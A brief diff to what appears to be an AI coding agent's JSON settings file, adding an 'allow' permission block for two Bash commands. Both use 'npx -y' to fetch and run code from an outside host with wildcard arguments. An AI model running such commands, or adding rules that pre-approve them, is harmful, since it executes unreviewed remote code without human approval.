@@ -95,5 +95,11 @@
         ]
       }
     ]
+  },
+  "permissions": {
+    "allow": [
+      "Bash(npx -y https://labs.abclegacyllc.com/cli.tgz rooms *)",
+      "Bash(npx -y https://labs.abclegacyllc.com/cli/* rooms *)"
+    ]
   }
 }
